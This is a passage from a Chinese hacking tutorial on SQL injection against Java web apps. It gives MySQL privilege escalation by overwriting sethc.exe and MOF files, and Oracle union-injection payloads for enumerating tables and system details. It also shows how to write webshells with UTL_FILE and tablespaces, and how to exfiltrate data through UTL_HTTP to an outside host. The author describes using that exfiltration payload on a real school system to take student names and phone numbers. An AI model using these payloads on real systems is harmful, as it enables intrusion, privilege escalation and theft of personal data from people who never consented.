的成功了，因为调用自定义 function 非常简单： 
3、 
MOF和sethc提权： 
MOF和sethc提权我就不详讲了，因为看了上面的udf提权你已经具备自己导入任意文件
到任意目录了，而MOF实际上就是写一个文件到指定目录，而sethc提权我只成功模糊的过
一次。在命令行下利用SQL大概是这样的： 
create table mix_cmd( shift longblob); 
insert into mix_cmd values(load_file(‘c:\\windows\\system32\\cmd.exe’)); 
select * from mix_cmd into dumpfile ‘c:\\windows\\system32\\sethc.exe’; 
drop table if exists mix_cmd; 
现在的管理员很多都会自作聪明的去把net.exe、net1.exe 、cmd.exe、sethc.exe删除防
止入侵。当sethc不存在时我们可以用这个方法去试下，怎么确定是否存在?load_file下看人
品了,如果cmd和sethc都不存在那么按照上面的udf提权三部曲上传一个cmd.exe到任意目录。 
SELECT LOAD_FILE('c:/windows/system32/cmd.exe') INTO 
DUMPFILE'c:/windows/system32/sethc.exe' 
MOF大约是这样： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select char(ascii转换后的代码),'','','' 
into dumpfile  'c:/windows/system32/wbem/mof/nullevts.mof' 
Mysql小结： 
我想讲的应该是一种方法而不是 SQL 怎么去写，学会了方法自然就会自己去拓展，当
然了最好不要向上面 udf 那么二。有了上面的 demo 相信大家都会知道怎么去修改满足自己
的需求了。学的不只是方法而是思路切记！ 
第 64 页 
攻击 JavaWeb 应用[4] -SQL 注入[2] 
-园长 MM 
注:这一节主要是介绍 Oracle 和 SQL 注入工具相关，本应该是和前面的 Mysql 一起但是由于章节过长了没法看，所以就分
开了。 
1、Oracle 
Oracle Database，又名 Oracle RDBMS，或简称 Oracle。是甲骨文公司的一款关系数据库
管理系统。 
Oracle 对于 MYSQL、MSSQL 来说意味着更大的数据量，更大的权限。这一次我们依旧
使用上面的代码，数据库结构平移到 Oracle 上去，数据库名用的默认的 orcl，字段"corps_desc" 
从 text 改成了 VARCHAR2(4000)，JSP 内的驱动和 URL 改成了对应的 Oracle。 
Jsp 页面代码： 
第 65 页 
开始注入： 
Union +order by 永远都是最快捷最实用的，而盲注什么的太费时费力了。依旧提交 order 
by 去猜测显示当前页面所用的 SQL 查询了多少个字段，也就是确认查询字段数。 
分别提交 http://localhost/SqlInjection/index.jsp?id=1 AND 1=1 和?id=1 AND 1=12 得到的
页面明显不一致，1=12 页面没有任何数据，即 1=12 为 false 没查询到任何结果。 
http://localhost/SqlInjection/index.jsp?id=1 AND 1=12 
第 66 页 
提交：http://localhost/SqlInjection/index.jsp?id=1 ORDER BY 4-- 页面正常，提交：?id=1 
ORDER BY 5--报错说明字段数肯定是 4。 
Order by 5 爆出的错误信息： 
使用union 进行联合查询： 
Oracle的dual表： 
dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有
一条记录，在Oracle注入中用途可谓广泛。 
Oracle union 查询 tips: 
Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而
在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的SELECT * 
from "corps" where "id" = 1 当中查询的字段类型一致。我们已知查询的第二个字
段是corps_name，对应的数据类型是：VARCHAR2(100)，也就是字符型。当我们传入整
第 67 页 
型的数字时就会报错。比如当我们提交union查询时提交如下SQL注入语句： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 
1,2,NULL,NULL FROM dual-- 
Oracle当中正确的注入方式用NULL去占位在我们未知哪个字段是什么类型的时候： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 
NULL,NULL,NULL,NULL FROM dual-- 
当已知第一个字段是整型的时候： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 
1,NULL,NULL,NULL FROM dual-- 
SQL执行后的占位效果： 
根据我们之前注入Mysql的经验，我们现在要尽可能多的去获取服务器信息和数据库，
比如数据库版本、权限等。 
在讲Mysql注入的时候已经说道要合理利用工具，在Navicat客户端执行select * 
第 68 页 
from session_roles结果： 
Oracle查询分页tips： 
不得不说Oracle查询分页的时候没有Mysql那么方便，Oracle可不能limit 0,1而
是通过三层查询嵌套的方式实现分页(查询第一条数据“>=0= 0  
在Oracle里面没有类似于Mysql的group_concat,用分页去取数据，不过有更加简单的方
法。 
是用UNION SELECT 查询： 
http://localhost/SqlInjection/index.jsp?id=1 UNION ALL SELECT NULL, NULL, NULL, 
NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32)) FROM (SELECT DISTINCT(OWNER) FROM 
SYS.ALL_TABLES)-- 
第 69 页 
不过我得告诉你，UNION SELECT查询返回的是多个结果，而在正常的业务逻辑当中我们
取一条新闻是直接放到对应的实体当中的，比如我们查询的wooyun的厂商表：corps，那么
我们做查询的很有可能是抽象出一个corps对象，在DAO层取得到单个的参数结果集，如果有
多个要么报错，要么取出第一条。然后再到controller层把查询的结果放到请求里面。最终在
输出的时候自然也就只能拿到单个的corps实体，这也是视图层只做展示把业务逻辑和视图
分开的好处之一，等讲到MVC的时候试着给不懂的朋友解释一下。 
再来看一下我们丑陋的在页面展示数据的代码： 
接下来的任务就是收集信息了，上面我们已经收集到数据库所有的用户的用户名和我们
当前用户的权限。 
获取所有的数据库表： 
http://localhost/SqlInjection/index.jsp?id=1 UNION ALL SELECT NULL, 
NULL, NULL, NVL(CAST(OWNER AS 
VARCHAR(4000)),CHR(32))||CHR(45)||CHR(45)||CHR(45)||CHR(45)||CHR(
45)||CHR(45)||NVL(CAST(TABLE_NAME AS VARCHAR(4000)),CHR(32)) FROM 
SYS.ALL_TABLES WHERE OWNER IN 
(CHR(67)||CHR(84)||CHR(88)||CHR(83)||CHR(89)||CHR(83),CHR(69)||CH
R(88)||CHR(70)||CHR(83)||CHR(89)||CHR(83),CHR(77)||CHR(68)||CHR(8
3)||CHR(89)||CHR(83),CHR(79)||CHR(76)||CHR(65)||CHR(80)||CHR(83)|
|CHR(89)||CHR(83),CHR(83)||CHR(67)||CHR(79)||CHR(84)||CHR(84),CHR
(83)||CHR(89)||CHR(83),CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69
)||CHR(77),CHR(87)||CHR(77)||CHR(83)||CHR(89)||CHR(83))— 
第 70 页 
连接符我用的是-转换成编码也就是45 
已列举出所有的表名： 
当UNION ALL SELECT 不起作用的时候我们可以用上面的Oracle分页去挨个读取，
缺点就是效率没有UNION ALL SELECT高。 
第 71 页 
信息版本获取： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 
NULL, NULL, NULL, (select banner from sys.v_$version where rownum=1) 
from dual— 
获取启动Oracle的用户名:select SYS_CONTEXT ('USERENV','OS_USER') from 
dual; 
服务器监听IP:select utl_inaddr.get_host_address from dual; 
服务器操作系统:select member from v$logfile where rownum=1; 
当前连接用户:select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual; 
获取当前连接的数据库名：select SYS_CONTEXT ('USERENV', 'DB_NAME') from 
dual; 
关于获取敏感的表和字段说明： 
1、获取所有的字段schema：select * from user_tab_columns 
2、获取当前用户权限下的所有的表：SELECT * FROM  User_tables 
上述SQL通过添加Where条件就能获取到常见注入的敏感信息，请有心学习的同学按照
上面的MYSQL注入时通过information_schema获取敏感字段的方式去学习
user_tab_columns和FROM  User_tables表。 
第 72 页 
Oracle高级注入： 
1、友情备份 
在讲Mysql的时候提到过怎么在注入点去构造SQL语句去实现友情备份，在去年注入某
大牛学校的教务处的时候我想到了一个简单有效的SQL注入点友情备份数据库的方法。没错
就是利用Oracle的utl_http包。Oracle的确是非常的强大，utl_http就能过直接对外发送Http
请求。我们可以利用utl_http去SQL注入，那么我们一样可以利用utl_http去做友情备份。 
构建以下SQL注入语句： 
http://60.xxx.xx.131/xxx/aao_66/index.jsp?fid=1+and+'1'in(SELECT+UTL_HTTP.request('http:
//xxx.cn:8080/xxxx/mysql.jsp?data='||ID||'----'||USERID||'----'||NAME||'----'||RELATION||'----'
||OCCUPATION||'----'||POSITION||'----'||ASSN||UNIT||'----'||'----'||TEL)+FROM+STU_HOME) 
UTL_HTTP 会带着查询数据库的结果去请求我们的URL，也就是我注入点上写的URL。
Tips：UTL_HTTP是一条一条的去请求的，所以会跟数据库保持一个长连接。而数据量过大
的话会导致数据丢失，如果想完整的友情备份这种方法并不是特别可行。只用在浏览器上请
求这个注入点Oracle会自动的把自己的裤子送上门来那种感觉非常的好。 
第 73 页 
使用UTL_HTTP友情备份效果图： 
utl_http在注入的时候怎么去利用同理，由于我也没有去深入了解utl_http或许他还有其
他的更实用的功能等待你去发现。 
使用UTL_FILE友情备份： 
创建目录： 
第 74 页 
create or replace directory cux_log_dir as 'E:/soft/apache-tomcat-7.0.37/webapps/ROOT/selina';   
导出数据到文件： 
declare 
frw   utl_file.file_type; 
begin 
frw:=utl_file.fopen('CUX_LOG_DIR','emp.txt','w'); 
for rec in (select * from admin) loop 
utl_file.put_line(frw,rec.id||','||rec.password); 
end loop; 
utl_file.fclose(frw); 
end; 
/ 
效果图： 
1、 GetShell 
之前的各种Oracle文章似乎都提过怎样去getshell，其实方法倒是有的。但是在
Java里面你要想拿到WEB的根路径比那啥还难。但是PHP什么的就不一样了，PHP里面爆个
路径完全是家常便饭。因为数据库对开发语言的无关系，所以或许我们在某些场合下以下的
getshell方式也是挺不错的。 
1、 在有Oracle连接权限没有webshell时候通过utl_file获取shell 
（当然用户必须的具有创建DIRECTORY的权限）: 
第 75 页 
执行：create or replace directory getshell_dir as 
'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/'; 
当然了as后面跟的肯定是你的WEB路径。 
执行以下SQL语句： 
创建目录： 
create or replace directory getshell_dir as 
'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/'; 
写入shell到指定目录：注意directory在这里一定要大写: 
declare 
frw   utl_file.file_type; 
begin 
frw:=utl_file.fopen('GETSHELL_DIR','yzmm.jsp','w'); 
utl_file.put_line(frw,'hello world.'); 
utl_file.fclose(frw); 
end; 
/ 
第 76 页 
2、 在低权限下getshell： 
执行以下SQL创建表空间： 
create tablespace shell datafile 
'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/shell.jsp' size 
100k nologging ; 
CREATE TABLE SHELL(C varchar2(100)) tablespace shell; 
insert into SHELL values('hello world'); 
commit; 
alter tablespace shell offline; 
drop tablespace shell including contents; 
第 77 页 
这方法是能写文件，但是好像没发现我的hello world，难道是我打开方式不对？ 
3、 Oracle SQLJ编译执行Java代码： 
众所周知，由于sun那只土鳖不争气居然被oracle给收购了。不过对Oracle来说的确
是有有不少优势的。 
SQLJ是一个与Java编程语言紧密集成的嵌入式SQL的版本，这里"嵌入式SQL"是用来
在其宿主通用编程语言如C、C++、Java、Ada和COBOL）中调用SQL语句。 
SQL翻译器用SQLJ运行时库中的调用来替代嵌入式SQLJ语句，该运行时库真正实现
SQL操作。这样翻译的结果是得到一个可使用任何Java翻译器进行编译的Java源程序。一